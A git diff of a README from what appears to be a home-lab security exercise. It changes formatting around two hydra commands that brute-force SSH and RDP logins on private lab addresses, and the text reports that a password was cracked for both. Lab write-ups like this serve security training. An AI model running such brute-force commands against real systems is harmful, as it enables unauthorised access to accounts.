@@ -22,10 +22,10 @@ Attack Proof (Ubuntu Linux):<br>
 Targets: I attempted to crack the Administrator (Windows) and soc (Linux) accounts.<br>
 Outcome: The attack was successful, identifying the correct password (Qweqwe123) for both systems.<br>
 
-Linux attack command -> hydra -vV -l soc -P passwords_linux.txt 192.168.101.11 ssh
+### Linux attack command -> hydra -vV -l soc -P passwords_linux.txt 192.168.101.11 ssh
 <img width="1291" height="501" alt="Hydra Atak - Linux" src="https://github.com/user-attachments/assets/731ea80c-6ad6-4c19-a129-f4253464e1a4" />
 
-Windows attack command -> hydra -vV -l Administrator -P passwords_windows.txt 192.168.101.20 rdp
+### Windows attack command ->  hydra -vV -l Administrator -P passwords_windows.txt 192.168.101.20 rdp 
 <img width="1299" height="497" alt="Hydra Atak - Windows" src="https://github.com/user-attachments/assets/ff1028f2-80ed-41f7-acb5-7e1622e43a4a" />
 
 3. Analysis and Technical Evidence
